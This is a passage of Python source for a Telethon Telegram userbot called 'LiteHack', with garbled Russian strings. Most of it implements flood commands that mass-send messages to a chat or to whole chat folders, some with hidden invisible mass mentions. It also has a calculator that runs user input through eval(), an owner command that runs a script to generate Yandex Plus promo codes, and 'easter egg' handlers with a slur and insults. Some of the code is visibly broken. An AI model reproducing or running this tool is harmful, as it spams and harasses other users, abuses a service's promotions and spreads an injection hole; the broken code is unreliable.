            await event.respond(f"‚ö†Ô∏è –ó–∞–¥–∞—á–∞ {arg} –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")
            
@client.on(events.NewMessage(outgoing=True, pattern=r'^(?:' + '|'.join(PCHFLOOD_COMMANDS) + r')\s+(.+)'))
async def pchflood_handler(event):
    args = event.pattern_match.group(1)
    try:
        parts = args.split(' ', 2)
        if len(parts) < 3:
            raise ValueError("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤")
        count = int(parts[0])
        delay_raw = parts[1]
        text = parts[2]
        
        if re.match(r'^\d+(\.\d+)?$', delay_raw):
            delay = float(delay_raw)
        else:
            delay = humanfriendly.parse_timespan(delay_raw)
    except Exception as e:
        await event.respond(f"‚ùå –û—à–∏–±–∫–∞ –≤ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å–µ –∫–æ–º–∞–Ω–¥—ã: {e}\n\n{PCHFLOOD_EXAMPLES}", parse_mode='markdown')
        return

    filters = await client(GetDialogFiltersRequest())
    if not filters:
        await event.respond("‚ùå –ù–µ—Ç –ø–∞–ø–æ–∫ —á–∞—Ç–æ–≤.")
        return

    msg = "üêù –í—ã–±–µ—Ä–∏—Ç–µ –ø–∞–ø–∫—É –¥–ª—è —Ñ–ª—É–¥–∞ –ø–æ —á–∞—Ç–∞–º (–≤–≤–µ–¥–∏—Ç–µ):\n"
    for i, f in enumerate(filters):
        msg += f"<code>fr!–ø—á—Ñ–ª—É–¥—Å—Ç–∞—Ä—Ç {i} {count} {delay} {text}</code> ‚Äî {f.title}\n"
    await event.respond(msg, parse_mode='html')


@client.on(events.NewMessage(outgoing=True, pattern=r'^fr!–ø—á—Ñ–ª—É–¥—Å—Ç–∞—Ä—Ç\s+(\d+)\s+(\d+)\s+(\S+)\s+(.+)'))
async def handle_pchflood_manual(event):
    try:
        idx = int(event.pattern_match.group(1))
        count = int(event.pattern_match.group(2))
        delay_raw = event.pattern_match.group(3)
        text = event.pattern_match.group(4)
        
        if re.match(r'^\d+(\.\d+)?$', delay_raw):
            delay = float(delay_raw)
        else:
            delay = humanfriendly.parse_timespan(delay_raw)
    except Exception as e:
        await event.respond(f"‚ùå –û—à–∏–±–∫–∞ –≤ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å–µ –∫–æ–º–∞–Ω–¥—ã: {e}\n\n"
                            f"–ü—Ä–∏–º–µ—Ä: fr!–ø—á—Ñ–ª—É–¥—Å—Ç–∞—Ä—Ç 0 10 0.5 –¢–µ–∫—Å—Ç")
        return

    filters = await client(GetDialogFiltersRequest())
    if idx >= len(filters):
        await event.respond("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –Ω–æ–º–µ—Ä –ø–∞–ø–∫–∏.")
        return

    selected = filters[idx]
    targets = [d.peer.dialog_id for d in selected.include_peers]
    task_id = f"pchflood:{event.sender_id}:{idx}"
    task = asyncio.create_task(run_flood(event, targets, count, delay, text, between_chats=True))
    active_floods[task_id] = task
    await event.respond(f"üêù –§–ª—É–¥ –ø–æ —á–∞—Ç–∞–º –Ω–∞—á–∞–ª—Å—è: {selected.title}")
    
@client.on(events.NewMessage(outgoing=True, pattern=r'^(?:' + '|'.join(FLOOD_COMMANDS) + r')\s+(.+)'))
async def flood_handler(event):
    args = event.pattern_match.group(1)
    try:
        # –ü–∞—Ä—Å–∏–º –ø–æ –≤–∞—à–µ–º—É —Ñ–æ—Ä–º–∞—Ç—É: count delay text
        # –†–∞–∑–±–∏–≤–∞–µ–º args –ø–æ –ø—Ä–æ–±–µ–ª–∞–º, –≥–¥–µ count - –ø–µ—Ä–≤—ã–π –∞—Ä–≥—É–º–µ–Ω—Ç, delay - –≤—Ç–æ—Ä–æ–π, –æ—Å—Ç–∞–ª—å–Ω–æ–µ - —Ç–µ–∫—Å—Ç
        parts = args.split(' ', 2)
        if len(parts) < 3:
            raise ValueError("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤")
        count = int(parts[0])
        delay_raw = parts[1]
        text = parts[2]

        # –ü–∞—Ä—Å–∏–º –∑–∞–¥–µ—Ä–∂–∫—É
        if re.match(r'^\d+(\.\d+)?$', delay_raw):
            delay = float(delay_raw)
        else:
            delay = humanfriendly.parse_timespan(delay_raw)

    except Exception as e:
        await event.respond(f"‚ùå –û—à–∏–±–∫–∞ –≤ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å–µ –∫–æ–º–∞–Ω–¥—ã: {e}\n\n{FLOOD_EXAMPLES}", parse_mode='markdown')
        return

    # –î–∞–ª—å—à–µ –≤–∞—à –∫–æ–¥ —Å –ø–∏–Ω–≥–æ–º –∏ –∑–∞–ø—É—Å–∫–æ–º
    reply_msg = await event.get_reply_message() if '&–ø–æ—Å—Ç' in text and event.is_reply else None
    text = text.replace('&–ø–æ—Å—Ç', '').strip()

    if '@all' in text:
        text += await generate_invisible_ping(event.chat_id, limit=20)
    elif '@allwa' in text:
        text += await generate_invisible_ping(event.chat_id, without_admins=True, limit=20)
    elif m := re.search(r'@all(wa)?(\d+)', text):
        wa, lim = m.groups()
        text += await generate_invisible_ping(event.chat_id, without_admins=bool(wa), limit=int(lim))

    task = asyncio.create_task(run_flood(event, [event.chat_id], count, delay, text, reply_msg=reply_msg))
    active_floods[event.chat_id] = task
    
# –£—Ç–∏–ª–∏—Ç–∞: –≥–µ–Ω–µ—Ä–∞—Ü–∏—è —Ç–µ–∫—Å—Ç–∞ —Å "–Ω–µ–≤–∏–¥–∏–º—ã–º" –ø–∏–Ω–≥–æ–º
async def generate_invisible_ping(chat, all_users=True, without_admins=False, limit=20):
    mentions = []
    async for user in client.iter_participants(chat):
        if without_admins and user.participant.admin_rights:
            continue
        if user.username:
            mentions.append(f"@{user.username}")
        if len(mentions) >= limit:
            break
    return "\u2060".join(mentions) if mentions else ""

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤—Å–µ—Ö –≤–∏–¥–æ–≤ —Ñ–ª—É–¥–∞
async def run_flood(event, targets, count, delay, text, between_chats=False, reply_msg=None):
    for target in targets:
        for i in range(count):
            try:
                if reply_msg:
                    await client.send_message(target, text, file=reply_msg.media)
                else:
                    await client.send_message(target, text)
                await asyncio.sleep(delay)
                if between_chats:
                    break  # –¢–æ–ª—å–∫–æ 1 —Å–æ–æ–±—â–µ–Ω–∏–µ –Ω–∞ —á–∞—Ç
            except Exception as e:
                await event.respond(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ {target}: {e}")

# –ü–∞—Ä—Å–∏–Ω–≥ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ —Ñ–ª—É–¥–∞
def parse_args(match):
    count = int(match.group(1))
    delay_raw = match.group(2)
    text = match.group(3)
    try:
        if re.match(r'^\d+(\.\d+)?$', delay_raw):
            delay = float(delay_raw)
        else:
            delay = humanfriendly.parse_timespan(delay_raw)
    except:
        delay = 1.0
    return count, delay, text

# –§–ª—É–¥ –≤ —Ç–µ–∫—É—â–µ–º —á–∞—Ç–µ
@client.on(events.NewMessage(outgoing=True, pattern=r'^(?:' + '|'.join(FLOOD_COMMANDS) + r')\s+(\d+)\s+(\S+)\s+(.+)'))
async def flood_handler(event):
    count, delay, text = parse_args(event.pattern_match)
    reply_msg = await event.get_reply_message() if '&–ø–æ—Å—Ç' in text and event.is_reply else None
    text = text.replace('&–ø–æ—Å—Ç', '').strip()
    
    if '@all' in text:
        text += await generate_invisible_ping(event.chat_id, limit=20)
    elif '@allwa' in text:
        text += await generate_invisible_ping(event.chat_id, without_admins=True, limit=20)
    elif m := re.search(r'@all(wa)?(\d+)', text):
        wa, lim = m.groups()
        text += await generate_invisible_ping(event.chat_id, without_admins=bool(wa), limit=int(lim))

    task = asyncio.create_task(run_flood(event, [event.chat_id], count, delay, text, reply_msg=reply_msg))
    active_floods[event.chat_id] = task

# –§–ª—É–¥ –ø–æ –ø–∞–ø–∫–µ (—á–µ—Ä–µ–∑ –∫–æ–º–∞–Ω–¥—É –≤—ã–±–æ—Ä–∞)
@client.on(events.NewMessage(outgoing=True, pattern=r'^fr!–≤—ã–±–æ—Ä–ø–∞–ø–∫–∏ (\d+) (\d+) (\d+(?:\.\d+)?) (.+)'))
async def manual_folder_select(event):
    idx = int(event.pattern_match.group(1))
    count = int(event.pattern_match.group(2))
    delay = float(event.pattern_match.group(3))
    text = event.pattern_match.group(4)

    filters = await client(GetDialogFiltersRequest())
    if idx >= len(filters):
        await event.respond("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –Ω–æ–º–µ—Ä –ø–∞–ø–∫–∏.")
        return

    selected = filters[idx]
    targets = [d.peer.dialog_id for d in selected.include_peers]
    task_id = f"pflood:{event.sender_id}:{idx}"
    task = asyncio.create_task(run_flood(event, targets, count, delay, text))
    active_floods[task_id] = task
    await event.respond(f"üöÄ –ó–∞–ø—É—â–µ–Ω —Ñ–ª—É–¥ –ø–æ –ø–∞–ø–∫–µ: {selected.title}")

# –°–ø–∏—Å–æ–∫ –ø–∞–ø–æ–∫ –≤—Ä—É—á–Ω—É—é
@client.on(events.NewMessage(outgoing=True, pattern=r'^(?:' + '|'.join(PFLOOD_COMMANDS) + r')\s+(\d+)\s+(\S+)\s+(.+)'))
async def pflood_handler(event):
    count, delay, text = parse_args(event.pattern_match)
    filters = await client(GetDialogFiltersRequest())
    if not filters:
        await event.respond("‚ùå –ù–µ—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω–Ω—ã—Ö –ø–∞–ø–æ–∫.")
        return

    msg = "üìÇ –í—ã–±–µ—Ä–∏—Ç–µ –ø–∞–ø–∫—É –¥–ª—è —Ñ–ª—É–¥–∞ (–≤–≤–µ–¥–∏—Ç–µ):\n"
    for i, f in enumerate(filters):
        msg += f"<code>fr!–≤—ã–±–æ—Ä–ø–∞–ø–∫–∏ {i} {count} {delay} {text}</code> ‚Äî {f.title}\n"
    await event.respond(msg, parse_mode='html')

# –§–ª—É–¥ –º–µ–∂–¥—É —á–∞—Ç–∞–º–∏ (pchflood)
@client.on(events.NewMessage(outgoing=True, pattern=r'^fr!–ø—á—Ñ–ª—É–¥ (\d+) (\S+) (.+)'))
async def pchflood_handler(event):
    count, delay, text = parse_args(event.pattern_match)
    filters = await client(GetDialogFiltersRequest())
    if not filters:
        await event.respond("‚ùå –ù–µ—Ç –ø–∞–ø–æ–∫ —á–∞—Ç–æ–≤.")
        return

    msg = "üêù –í—ã–±–µ—Ä–∏—Ç–µ –ø–∞–ø–∫—É –¥–ª—è —Ñ–ª—É–¥–∞ –ø–æ —á–∞—Ç–∞–º (–≤–≤–µ–¥–∏—Ç–µ):\n"
    for i, f in enumerate(filters):
        msg += f"<code>fr!–ø—á—Ñ–ª—É–¥—Å—Ç–∞—Ä—Ç {i} {count} {delay} {text}</code> ‚Äî {f.title}\n"
    await event.respond(msg, parse_mode='html')

@client.on(events.NewMessage(outgoing=True, pattern=r'^fr!–ø—á—Ñ–ª—É–¥—Å—Ç–∞—Ä—Ç (\d+) (\d+) (\d+(?:\.\d+)?) (.+)'))
async def handle_pchflood_manual(event):
    idx = int(event.pattern_match.group(1))
    count = int(event.pattern_match.group(2))
    delay = float(event.pattern_match.group(3))
    text = event.pattern_match.group(4)
    filters = await client(GetDialogFiltersRequest())
    selected = filters[idx]
    targets = [d.peer.dialog_id for d in selected.include_peers]
    task_id = f"pchflood:{event.sender_id}:{idx}"
    task = asyncio.create_task(run_flood(event, targets, count, delay, text, between_chats=True))
    active_floods[task_id] = task
    await event.respond(f"üêù –§–ª—É–¥ –ø–æ —á–∞—Ç–∞–º –Ω–∞—á–∞–ª—Å—è: {selected.title}")

# –û—Å—Ç–∞–Ω–æ–≤–∫–∞ —Ñ–ª—É–¥–∞
@client.on(events.NewMessage(pattern=r'^fr!flood-off$'))
async def stop_flood(event):
    chat_id = event.chat_id
    task = active_floods.pop(chat_id, None)
    if task:
        task.cancel()
        await event.respond("üõë –§–ª—É–¥ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ —ç—Ç–æ–º —á–∞—Ç–µ.")
    else:
        await event.respond("‚ö†Ô∏è –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–≥–æ —Ñ–ª—É–¥–∞ –≤ —ç—Ç–æ–º —á–∞—Ç–µ.")

# –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø–æ –∑–∞–¥–∞—á–µ
@client.on(events.NewMessage(pattern=r'^fr!–∑–∞–¥–∞—á–∞- —Ñ–ª—É–¥(?: (.+))?$'))
async def stop_flood_task(event):
    arg = event.pattern_match.group(1)
    if arg:
        task = active_floods.pop(arg, None)
        if task:
            task.cancel()
            await event.respond(f"üõë –§–ª—É–¥-–∑–∞–¥–∞—á–∞ {arg} –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞.")
        else:
            await event.respond(f"‚ö†Ô∏è –ó–∞–¥–∞—á–∞ {arg} –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")
    else:
        count = 0
        for task in active_floods.values():
            task.cancel()
            count += 1
        active_floods.clear()
        await event.respond(f"üßπ –û—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –∑–∞–¥–∞—á: {count}")


@client.on(events.NewMessage(pattern=r'^fr!calc (.+)'))
async def calc_handler(event):
    query = event.pattern_match.group(1).strip().lower()

    # –ü–æ–ø—ã—Ç–∫–∞ –ø–∞—Ä—Å–∏—Ç—å: 1) –≤–∞–ª—é—Ç–∞ —á–∏—Å–ª–æ - –≤–∞–ª—é—Ç–∞  2) —á–∏—Å–ª–æ –≤–∞–ª—é—Ç–∞ - –≤–∞–ª—é—Ç–∞
    pattern1 = re.match(r'([a-zA-Z]{3,5})\s+([\d\.]+)\s*-\s*([a-zA-Z]{3,5})', query)
    pattern2 = re.match(r'([\d\.]+)\s+([a-zA-Z]{3,5})\s*-\s*([a-zA-Z]{3,5})', query)

    if pattern1 or pattern2:
        if pattern1:
            from_curr = pattern1.group(1)
            amount = float(pattern1.group(2))
            to_curr = pattern1.group(3)
        else:
            amount = float(pattern2.group(1))
            from_curr = pattern2.group(2)
            to_curr = pattern2.group(3)

        from_id = COINGECKO_IDS.get(from_curr)
        to_vs = COINGECKO_IDS.get(to_curr)

        if not from_id or not to_vs:
            await event.respond("‚ùå –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç—Å—è —Ç–æ–ª—å–∫–æ: üíµ USDT, ü™ô BTC, ‚öôÔ∏è TON, üá∫üá∏ USD, üá∑üá∫ RUB")
            return

        url = f"https://api.coingecko.com/api/v3/simple/price?ids={from_id}&vs_currencies={to_vs}"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                 if resp.status != 200:
                     print("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ")
                     return False
    
                encrypted_b64 = await resp.read()
                data = decrypt_json(encrypted_b64, key, iv)
                price = data[from_id][to_vs]
                result = round(price * amount, 4)
                await event.respond(f"üí± {amount} {from_curr.upper()} = {result} {to_curr.upper()}")
        except Exception:
            await event.respond("‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∫—É—Ä—Å–∞ –≤–∞–ª—é—Ç.")
        return

    # –§–æ—Ä–º–∞—Ç: –≤–∞–ª—é—Ç–∞ —á–∏—Å–ª–æ (–∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –≤ RUB –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é)
    pattern_simple = re.match(r'([a-zA-Z]{3,5})\s+([\d\.]+)$', query)
    pattern_simple_rev = re.match(r'([\d\.]+)\s+([a-zA-Z]{3,5})$', query)

    if pattern_simple or pattern_simple_rev:
        if pattern_simple:
            from_curr = pattern_simple.group(1)
            amount = float(pattern_simple.group(2))
        else:
            amount = float(pattern_simple_rev.group(1))
            from_curr = pattern_simple_rev.group(2)

        to_curr = 'rub'
        from_id = COINGECKO_IDS.get(from_curr)
        to_vs = COINGECKO_IDS.get(to_curr)

        if not from_id:
            await event.respond("‚ùå –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç—Å—è —Ç–æ–ª—å–∫–æ: üíµ USDT, ü™ô BTC, ‚öôÔ∏è TON, üá∫üá∏ USD, üá∑üá∫ RUB")
            return

        url = f"https://api.coingecko.com/api/v3/simple/price?ids={from_id}&vs_currencies={to_vs}"
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    data = await resp.json()
                    price = data[from_id][to_vs]
                    result = round(price * amount, 4)
                    await event.respond(f"üí± {amount} {from_curr.upper()} = {result} {to_curr.upper()}")
        except Exception as e:
            await event.respond(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∫—É—Ä—Å–∞ –≤–∞–ª—é—Ç:\n<code>{e}</code>")
        return

    # –ê—Ä–∏—Ñ–º–µ—Ç–∏–∫–∞
    try:
        result = eval(query)
        await event.respond(f"üßÆ –†–µ–∑—É–ª—å—Ç–∞—Ç: <code>{result}</code>")
    except Exception:
        await event.respond("‚ùå –ù–µ–≤–µ—Ä–Ω–æ–µ –≤—ã—Ä–∞–∂–µ–Ω–∏–µ –∏–ª–∏ –æ—à–∏–±–∫–∞ –≤ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å–µ.")

@client.on(events.NewMessage(pattern=r'/sosat'))
async def seretere(event):
    await event.respond("–ê—Ä—Ç: –¢—ã –º–µ–Ω—è —à–æ–ª–∏ –∑–∞–¥–æ–∫—Å–∏—Ç—å —Å–æ–±—Ä–∞–ª—Å—è (–ü–∞—Å—Ö–∞–ª–∫–∞)")
   
@client.on(events.NewMessage(pattern=r'!niga'))
async def seretere(event):
    await event.respond("–¢–æ—É—Å: –í–µ—Å–µ–ª–æ, —è –æ–¥–Ω–æ–º—É –º–µ–ª–∫–æ–º—É —Å–∫–∞–∑–∞–ª —á—Ç–æ–± –æ–Ω –Ω–∞–ø—Ä—è–≥ —Å–≤–æ–∏ 3 —Ö—Ä–æ–º–æ—Å–æ–º—ã –∏ —É—Å–ø–æ–∫–æ–∏–ª—Å—è (–ü–∞—Å—Ö–∞–ª–∫–∞)")
    
@client.on(events.NewMessage(pattern=r'/ban_bot'))
async def seretere(event):
    await event.respond("–°–µ—Ä–µ: /ban error_kill –∑–¥–æ–ª–±–∞–ª 1day (–ü–∞—Å—Ö–∞–ª–∫–∞)")
    
@client.on(events.NewMessage(pattern=r'!test'))
async def seretere(event):
    await event.respond("–§–†: –ü—Ä–æ–≥—Ä–∞–º–º–∏—Å—Ç, –ø–ª–µ–π–±–æ–π, —Ñ–∏–ª–∞–Ω—Ç—Ä–æ–ø (–ü–∞—Å—Ö–∞–ª–∫–∞)")

@client.on(events.NewMessage(pattern=r'!testgit'))
async def seretere(event):
    await event.respond("–º—è—É–º—è—É–º—è—É")
    
@client.on(events.NewMessage(pattern=r'!help'))
async def seretere(event):
    await event.respond("–ó–µ–ø–µ–Ω: –ë–ª—è—Ç—å —Ö–≤–∞—Ç–∏—Ç —Ö–µ–ª–ø –ø–∏—Å–∞—Ç—å —Ç–µ–±–µ —É–∂–µ –Ω–∏—á–µ–≥–æ –Ω–µ –ø–æ–º–æ–∂–µ—Ç (–ü–∞—Å—Ö–∞–ª–∫–∞) [–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –∫–æ–º–∞–Ω–¥ –Ω–∞–ø–∏—à–∏—Ç–µ fr!help ]")
    
@client.on(events.NewMessage(pattern=r'!xyz'))
async def seretere(event):
    await event.respond("–ö—Ä—É–≥–æ–≤: –ß–µ —Ç–∞–º (–ü–∞—Å—Ö–∞–ª–∫–∞)")

@client.on(events.NewMessage(pattern=r'!–ü–†–û–ë–ò–í –ñ–û–ü–´'))
async def seretere(event):
    await event.respond("–ö–Ω—è–∑—å: —Ö—É–π (–ü–∞—Å—Ö–∞–ª–∫–∞)")

@client.on(events.NewMessage(pattern=r'fr!promoplus'))
@owner_only
async def run_yandex_plus_script(event):
    try:
        # Inform user that script is starting
        await event.respond("–ó–∞–ø—É—Å–∫–∞—é –≥–µ–Ω–µ—Ä–∞—Ü–∏—é –ø—Ä–æ–º–æ–∫–æ–¥–∞ –Ø–Ω–¥–µ–∫—Å –ü–ª—é—Å...")
        
        python_exec = 'python3' if platform.system() != "Windows" else 'python'
        # Run the script and capture output
        process = await asyncio.create_subprocess_exec(
            PYTHON_EXECUTABLE, 'plus.py',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=os.path.join(os.getcwd(), 'addons')  # —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ä–∞–±–æ—á—É—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
        )
        
        # Read output line by line
        while True:
            line = await process.stdout.readline()
            if not line:
                break
            # Send each line of output
            await event.respond(f"<code>{line.decode().strip()}</code>", parse_mode='html')
        
        # Wait for process to complete
        await process.wait()
        
        # Send completion message
        await event.respond("–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞!")
        
    except Exception as e:
        await event.respond(f"–û—à–∏–±–∫–∞: {str(e)}")
    
@client.on(events.NewMessage(pattern=r'fr!love'))
@owner_only
async def send_love(event):
    hearts = ['‚ù§Ô∏è', 'üíï', 'üíñ', 'üíó', 'üíò', 'üíù', 'üíû', 'üíì']
    message = await event.respond("–°–æ–∑–¥–∞—é –∞–Ω–∏–º–∞—Ü–∏—é —Å–µ—Ä–¥–µ—á–µ–∫...")
    
    for _ in range(10):  # 10 –∏—Ç–µ—Ä–∞—Ü–∏–π –∞–Ω–∏–º–∞—Ü–∏–∏
        heart = random.choice(hearts)
        try:
            await message.edit(heart * 10)  # 10 —Å–µ—Ä–¥–µ—á–µ–∫ –≤ —Å—Ç—Ä–æ–∫–µ
            await asyncio.sleep(0.5)
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –≤ –∞–Ω–∏–º–∞—Ü–∏–∏: {e}")
            break
        
@client.on(events.NewMessage(pattern=r'fr!roll'))
@owner_only
async def roll_dice(event):
    """–ë—Ä–æ—Å–∞–µ—Ç –∏–≥—Ä–∞–ª—å–Ω—É—é –∫–æ—Å—Ç—å –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç"""
    result = random.randint(1, 6)
    await event.respond(f"üé≤ –†–µ–∑—É–ª—å—Ç–∞—Ç –±—Ä–æ—Å–∫–∞: {result}")

@client.on(events.NewMessage(pattern=r'fr!report'))
@owner_only
async def report_user(event):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –∂–∞–ª–æ–±—É –Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    if event.is_reply:
        try:
            replied_msg = await event.get_reply_message()
            reason = InputReportReasonSpam()  # –ú–æ–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å –Ω–∞ –¥—Ä—É–≥–æ–π reason
            
            await client(functions.messages.ReportRequest(
                peer=event.chat_id,
                id=[replied_msg.id],
                reason=reason,
                message="–ù–∞—Ä—É—à–µ–Ω–∏–µ –ø—Ä–∞–≤–∏–ª"
            ))
            
            await event.respond("‚úÖ –ñ–∞–ª–æ–±–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞")
        except Exception as e:
            await event.respond(f"‚ùå –û—à–∏–±–∫–∞: {str(e)}")
    else:
        await event.respond("‚ùå –û—Ç–≤–µ—Ç—å—Ç–µ –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–≥–æ —Ö–æ—Ç–∏—Ç–µ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å—Å—è")

async def main():
    await client.start()
    print("")
    print(f"{INFO_COLOR}Userbot –∑–∞–ø—É—â–µ–Ω{RESET_COLOR}")
    # –ó–∞–ø—É—Å–∫ aiogram polling –≤ —Ñ–æ–Ω–µ
    asyncio.create_task(dp.start_polling())
    print(f"{INFO_COLOR}–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω{RESET_COLOR}")
    print(f"{INFO_COLOR}–ë–æ–ª—å—à–µ —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç —Å–∫—Ä–∏–ø—Ç–∞ –Ω–µ –±—É–¥–µ—Ç, –∏—Å–∫–ª—é—á–∏—Ç–µ–ª—å–Ω–æ –ª–æ–≥–∏.{RESET_COLOR}")
    print(f"{INFO_COLOR}–ü—Ä–∏—è—Ç–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è LiteHack!\n\n{RESET_COLOR}")
    print(f"{INFO_COLOR}–î–ª—è –≤—ã–∫–ª—é—á–µ–Ω–∏—è —é–∑–µ—Ä–±–æ—Ç–∞ –Ω–∞–∂–º–∏—Ç–µ Ctrl + C{RESET_COLOR}")
    # –ü—Ä–æ—Å—Ç–æ –¥–µ—Ä–∂–∏–º userbot –∑–∞–ø—É—â–µ–Ω–Ω—ã–º
    await asyncio.Event().wait()
    
if __name__ == '__main__':
    client.loop.run_until_complete(main())
